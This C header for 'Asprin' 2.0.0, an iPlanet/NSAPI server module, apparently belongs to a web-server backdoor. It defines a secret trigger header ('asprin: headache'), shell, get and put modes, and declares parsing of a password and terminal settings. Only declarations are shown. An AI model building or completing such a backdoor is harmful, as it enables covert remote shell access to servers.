/*********************************************/
/*                                           */
/*  __ _ ___ _ __  _ __(_)_ __               */
/* / _` / __| '_ \| '__| | '_ \              */
/*| (_| \__ \ |_) | |  | | | | |             */
/* \__,_|___/ .__/|_|  |_|_| |_|             */
/*          |_|                              */
/*                                           */
/*                    by SagE <sage@t0s.org> */
/*                                           */
/*********************************************/

#define ASPRIN_VERSION "2.0.0"

#define ASPRIN_VERSION_NUM 0x20000

#define ASPRIN_VERSION_MAJOR 2
#define ASPRIN_VERSION_MINOR 0
#define ASPRIN_VERSION_MICRO 0


#if !defined(XP_UNIX) && !defined(XP_WIN32)
  #if defined(WIN32)
    #define XP_WIN32
  #else
    #define XP_UNIX
  #endif
#endif

#ifdef XP_WIN32
#define NSAPI_PUBLIC __declspec(dllexport)
#else /* !XP_WIN32 */
#define NSAPI_PUBLIC
#endif /* !XP_WIN32 */


#define ASPRIN_SH  1
#define ASPRIN_GET 2
#define ASPRIN_PUT 3

/**********************************************/
/* You can change the next values for one of  */
/* you want throw configure.                  */
/**********************************************/

#ifndef ASPRIN_FUNC
#define ASPRIN_FUNC asprin
#endif

#ifndef ASPRIN_NAME
#define ASPRIN_NAME "Asprin"
#endif

#ifndef HEADER_NAME
#define HEADER_NAME  "asprin"
#endif

#ifndef HEADER_VALUE
#define HEADER_VALUE "headache"
#endif

/**********************************************/
/* IPlanet includes                           */
/**********************************************/
#include "nsapi.h"
#include "prio.h"
#include "private/pprio.h"

/**********************************************/
/* System includes                            */
/**********************************************/
#include <string.h>
#include <unistd.h>
#include <signal.h>


/**********************************************/
/* Asprin includes                            */
/**********************************************/
#include "shell.h"

/**********************************************/
/* Asprin functions                           */
/**********************************************/

int getClientSocketIPlanet(Session *sn);

int splitHeaderValue(char *value,char **password,int *cmdt,
                     char **term,int *wx,int *wy,char **field);
